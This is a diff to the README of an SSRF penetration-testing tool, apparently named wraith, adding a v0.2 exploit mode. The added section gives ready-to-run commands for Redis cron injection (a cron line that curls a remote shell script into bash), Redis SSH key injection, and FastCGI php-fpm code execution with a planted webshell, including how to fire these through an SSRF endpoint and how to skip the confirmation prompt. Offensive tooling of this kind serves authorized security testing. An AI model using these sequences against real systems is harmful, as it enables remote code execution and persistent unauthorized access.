@@ -18,13 +18,13 @@ findings. It does not execute code, change target state, use harvested
 credentials, or open a reverse shell. Weaponization is a deferred, gated v0.2
 concern (see [Roadmap](#roadmap)).
 
-> **Status:** v0.1. The detection + confirmation engine is implemented and
-> tested: the filter-bypass mutator catalog, the cloud-metadata probes (incl.
-> the AWS IMDSv2 handshake), the OOB confirmation engine (local dnslib listener
-> + interactsh-compatible client), the `dict://` recon / `gopher://` generator,
-> and the version-gated MCP catalog. Every request routes through the shared
+> **Status:** v0.2. v0.1 shipped the detection + confirmation engine (the
+> filter-bypass mutator catalog, cloud-metadata probes, OOB confirmation, dict://
+> recon, gopher:// generator, and MCP catalog). v0.2 adds weaponized gopher://
+> exploitation behind an explicit `--exploit` gate (see
+> [Exploit Mode](#exploit-mode-v02)). Every request routes through the shared
 > `scan-primitives` scope-enforced client. See
-> [`V0.1-CRITERIA.md`](V0.1-CRITERIA.md) for the build contract and
+> [`V0.1-CRITERIA.md`](V0.1-CRITERIA.md) for the v0.1 build contract and
 > [`RESEARCH.md`](RESEARCH.md) for the niche brief.
 
 ## Ethical Use
@@ -86,7 +86,7 @@ wraith is organized into subcommands: `scan` (detect + confirm), `dict`
 (read-only recon), and `gopher` (payload generator).
 
 ```bash
-wraith --version          # -> wraith 0.1.0
+wraith --version          # -> wraith 0.2.0
 wraith --help             # subcommand overview
 ```
 
@@ -143,6 +143,104 @@ wraith gopher --protocol fastcgi --double-encode --script /var/www/html/index.ph
 The output is a `gopher://` URL with correct `%0d%0a` CRLF encoding, printed for
 the operator to place into a confirmed SSRF primitive. wraith **never fires it**.
 
+## Exploit Mode (v0.2)
+
+> **Ethical-use warning:** `--exploit` fires live attack payloads that may
+> cause remote code execution, privilege escalation, or data loss on the target
+> system. Only use this against systems you own or have explicit written
+> permission to test. The authors accept no liability for misuse.
+
+wraith v0.2 adds three weaponized `gopher://` exploit sequences behind an
+explicit `--exploit` gate. The gate is a double opt-in:
+
+1. Pass `--exploit` on the command line (without it, the subcommand exits 2).
+2. Confirm the prompt that warns you live payloads are about to fire (or pass
+   `--yes`/`-y` to skip it for scripted/CI use).
+
+```bash
+wraith exploit --exploit --yes --sequence redis-ssh \
+    --exploit-redis-ssh-key "ssh-rsa AAAA... attacker@evil" \
+    --host 127.0.0.1 --port 6379
+```
+
+### Sequences
+
+#### `redis-cron` — Redis cron-job injection
+
+Encodes a `CONFIG SET dir` + `CONFIG SET dbfilename` + `BGSAVE` sequence that
+writes an RDB dump containing a cron entry into `/etc/cron.d/` (or a custom
+dir). Requires a confirmed SSRF that reaches a Redis instance with write
+permissions.
+
+```bash
+wraith exploit --exploit --yes \
+    --sequence redis-cron \
+    --exploit-redis-cron-dir /etc/cron.d/ \
+    --exploit-redis-cron-entry "* * * * * root curl http://cb.example.com/shell|bash" \
+    --host 127.0.0.1 --port 6379
+```
+
+Parameters:
+- `--exploit-redis-cron-dir DIR` — cron drop directory (default: `/etc/cron.d/`)
+- `--exploit-redis-cron-entry ENTRY` — cron line(s) to inject (required)
+
+#### `redis-ssh` — Redis SSH authorized_keys injection
+
+Encodes a sequence that writes an attacker SSH pubkey into
+`/root/.ssh/authorized_keys` by setting `CONFIG SET dir /root/.ssh/` +
+`CONFIG SET dbfilename authorized_keys` + `BGSAVE`.
+
+```bash
+wraith exploit --exploit --yes \
+    --sequence redis-ssh \
+    --exploit-redis-ssh-key "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@evil" \
+    --host 127.0.0.1 --port 6379
+```
+
+Parameters:
+- `--exploit-redis-ssh-key PUBKEY` — SSH public key to inject (required)
+
+#### `fastcgi-rce` — FastCGI php-fpm RCE
+
+Encodes a FastCGI FCGI_PARAMS request with `SCRIPT_FILENAME` pointing at a
+writable PHP path and `PHP_VALUE auto_prepend_file=php://input`, passing a
+`<?php system('...')?>` webshell as `FCGI_STDIN`. Targets unprotected
+`php-fpm` sockets reachable via the SSRF.
+
+```bash
+wraith exploit --exploit --yes \
+    --sequence fastcgi-rce \
+    --exploit-fcgi-cmd "id" \
+    --exploit-fcgi-webshell-path /var/www/html/shell.php \
+    --host 127.0.0.1 --port 9000
+```
+
+Parameters:
+- `--exploit-fcgi-cmd CMD` — shell command to execute (required)
+- `--exploit-fcgi-webshell-path PATH` — `SCRIPT_FILENAME` for the FastCGI
+  request (default: `/var/www/html/shell.php`)
+
+### Firing through an SSRF injection point
+
+All three sequences output the generated `gopher://` URL to stdout. Pass
+`--target` to have wraith inject it through a confirmed SSRF primitive
+(scope-enforced via `--scope-file`):
+
+```bash
+wraith exploit --exploit --yes \
+    --sequence redis-ssh \
+    --exploit-redis-ssh-key "ssh-rsa AAAA... attacker@evil" \
+    --host 127.0.0.1 \
+    -u "https://app.example.com/fetch?url=FUZZ" \
+    --scope-file scope.txt
+```
+
+### `--yes` / `-y` — skip confirmation for scripted use
+
+For CI pipelines or automated exploitation chains, pass `--yes` (or `-y`) to
+skip the interactive confirmation prompt. Never pipe `--yes` blindly — the
+prompt exists to prevent accidental use.
+
 ## Modules
 
 | Module | Role | Status |
@@ -157,7 +255,8 @@ the operator to place into a confirmed SSRF primitive. wraith **never fires it**
 | `wraith.engine` | Scan orchestration: request-file parsing, injection, concurrent detect/confirm. | implemented |
 | `wraith.protocols` | `dict://` recon + `gopher://` payload generator (RESP / FastCGI). | implemented |
 | `wraith.mcp` | Version-gated MCP / AI-infra SSRF catalog (5 signatures). | implemented |
-| `wraith.cli` | argparse CLI: `scan` / `dict` / `gopher`. | implemented |
+| `wraith.cli` | argparse CLI: `scan` / `dict` / `gopher` / `exploit`. | implemented |
+| `wraith.exploit` | Weaponized gopher:// sequences: Redis cron/SSH injection, FastCGI RCE (v0.2, `--exploit` gate). | implemented |
 
 ## Example output
 
@@ -202,13 +301,14 @@ hermetic test tiers described in `V0.1-CRITERIA.md`.
 
 ## Roadmap
 
-The v0.1 build implements the detection/confirmation engine per
-[`V0.1-CRITERIA.md`](V0.1-CRITERIA.md). The following are **explicitly NOT in
-v0.1** (deferred):
+v0.1 implemented the detection/confirmation engine per
+[`V0.1-CRITERIA.md`](V0.1-CRITERIA.md). v0.2 shipped the weaponized
+`gopher://` exploit sequences (see [Exploit Mode](#exploit-mode-v02)).
 
-- **Weaponized `gopher://` exploitation** (Redis cron/SSH/`MODULE LOAD`,
-  FastCGI php-fpm RCE) &mdash; v0.2, behind a sandboxed `--exploit`/`--dangerous`
-  gate.
+The following remain **deferred** post-v0.2:
+
+- **Weaponized `gopher://` `MODULE LOAD`** &mdash; dynamically loaded Redis
+  modules for more capable post-exploitation.
 - **Using harvested cloud credentials** (SDK calls to enumerate/exfil)
   &mdash; detection emits the finding; credential use is a separate dangerous
   pivot.
